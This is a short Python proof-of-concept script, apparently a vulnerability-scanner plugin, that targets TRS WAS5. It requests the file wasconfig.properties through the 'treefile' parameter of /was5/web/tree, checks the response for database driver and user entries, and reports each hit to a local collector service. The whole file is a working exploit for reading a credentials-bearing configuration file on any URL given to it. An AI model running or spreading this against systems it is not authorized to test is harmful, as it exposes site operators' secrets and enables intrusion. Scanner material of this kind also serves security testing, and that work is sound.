#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS was5配置文件泄露
referer: unknown
author: Lucifer
description: 文件/WEB-INF/classes/com/trs/was/resource/wasconfig.properties内容泄露。
'''
import sys
import requests
import warnings
from termcolor import cprint

class trs_was5_config_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"sysdriver" in req.text and r"sysuser" in req.text:
                cprint("[+]存在TRS was5配置文件泄露漏洞...(高危)\tpayload: "+vulnurl, "red")
                postdata = {self.url:"存在TRS was5配置文件泄露漏洞...(高危)\tpayload: "+vulnurl}
                requests.post('http://localhost:8848/cms', json=postdata)
            else:
                cprint("[-]不存在trs_was5_config_disclosure漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_was5_config_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()